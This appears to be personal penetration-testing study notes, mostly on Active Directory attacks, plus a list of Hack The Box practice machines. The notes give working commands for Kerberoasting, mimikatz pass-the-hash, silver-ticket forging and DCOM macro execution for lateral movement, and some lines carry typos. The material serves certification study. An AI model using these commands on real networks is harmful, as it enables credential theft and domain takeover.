# Active directory attacks
--------------------------
Another terra incognita in there, knew very little of it before attending the course. 
As always, enumeration is essential. [Powerview](https://github.com/PowerShellMafia/PowerSploit/) from powersploit seems to be a good tool.
[Bloodhound](https://github.com/BloodHoundAD/BloodHound) is a way to go for graphical representation of gathered data and to discover
possible ways of exploitation towards gaining domain admin. [Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) is a neat
technique to use. Pass-the-hash, overpass-the-hash and pass-the-ticked could be used for lateral movement, especially with DCOM tricky
way to run macro docs on remote hosts. Silver tickets and golden tickets are ultimate targets (well, at least golden). Pwn DC == pwn all
the users, all the hashes are there.  
Remember about some caveats like that NTLM is used only when accessing resource by IP address and that there may be managed service accounts used
that have very long password which is unfeasible to bruteforce. Also when performing DCOM lateral movement, you may see some profile errors for
system account, those could be fixed by creating a directory `\\srv\c$\Windows\System32\config\systemprofile\Desktop` (or in Syswow64)

Some useful commands below.  

```powershell
# query LDAP for some info

$d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$pdc = $d.PdcRoleOwner.Name
$ddn = "DC=$($d.Name.Replace('.', ',DC='))"
$s = "LDAP://$pdc/$ddn"

$searcher = new-object System.DirectoryServices.DirectorySearcher([ADSI]$s)
$domain = new-object System.DirectoryServices.DirectoryEntry($s)
$searcher.SearchRoot = $domain

$searcher.Filter="samAccountType=80530638" # find users
$res = $searcher.FindAll()

# request SPN token
Add-Type -assemblyname System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPN'
```

PTH with mimikatz - `sekurlsa::pth /user:USR /domain:DOMAIN /ntlm:HASH /run:CMD`  
Forging silver ticket:

 1. Get service user's TGS
 2. Get some domain user SID `whoami /user`, omit last four digits
 3. Run `kerberos::golder /user:USER /domain:DOMAIN /sid:SID /target:SPN /service:SPNSERVICE /rc:PASSHASH /ptt`
    example: `kerberos::golden /user:kira /domain:example.com /sid:S-1-5-21... /target:CorpSqlServer.example.com /service:SQL /rc4:ABC... /ptt`

Calculate NTLM hash over plaintext:
```python
import hashlib, binascii
hash = hashlib.new('md4', 'PASS''.encode('utf-16le')).digest()
print(binascii.hexlify(hash))
```

Run macro doc on remote host via DCOM:
```powershell
$c = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "LHOST"))
$w = $c.Workbooks.Open("LPATH") # path to doc file
$c.Run("MACRONAME")
```

Most useful resource in general is [adsecurity.org](https://adsecurity.org/)

# Metasploit framework
----------------------
Basic usage is, well, basic and does not require some super skills but I'd like to check out
free [metasploit unleashed](https://www.offensive-security.com/metasploit-unleashed/) course from offsec.

# Powershell empire
-------------------
Barely touched this, seems to be pretty similar to MSF. Though looks like I should get in touch with 
[docs](http://www.powershellempire.com/) to be familiar with concepts. Weird, but their github repo is no longer supported.

# Vulnerable machines and practice resources
--------------------------------------------
List of additional stuff to pwn.

TJNull's list of HTB machines:

   Platform   |        Name        |       Status        
--------------|--------------------|---------------------
 nix          | lame               | pwnd
 nix          | brainfuck          | -
 nix          | shocker            | pwnd
 nix          | bashed             | pwnd
 nix          | nibbles            | pwnd
 nix          | beep               | pwnd
 nix          | cronos             | pwnd
 nix          | nineveh            | pwnd
 nix          | sense              | pwnd
 nix          | solidstate         | pwnd
 nix          | kotarak            | pwnd
 nix          | node               | pwnd
 nix          | valentine          | -
 nix          | poison             | -
 nix          | sunday             | -
 nix          | tartarsauce        | -
 nix          | jail               | -
 nix          | falafel            | -
 nix          | devops             | -
 nix          | hawk               | -
 win          | legacy             | pwnd
 win          | blue               | pwnd
 win          | devel              | pwnd
 win          | optimum            | pwnd
 win          | bastard            | pwnd
 win          | granny             | pwnd
 win          | arctic             | -
 win          | grandpa            | -
 win          | silo               | -
 win          | bounty             | -
 win          | jerry              | -
 win          | jeeves             | -
 win          | bart               | -
 win          | tally              | -
 win          | active             | -

[Virtual hacking labs](https://www.virtualhackinglabs.com/), kudos to Dyntra from offsec community chat.

# Credits
---------

 * [devhints bash scripting cheatsheet](https://devhints.io/bash)
 * [comparitech tcpdump cheatsheet](https://www.comparitech.com/net-admin/tcpdump-cheat-sheet/)
 * [TJNull's guide](https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html)
 * [cheatography](cheatography.com)
 * [hacktriks.xyz](book.hacktricks.xyz)
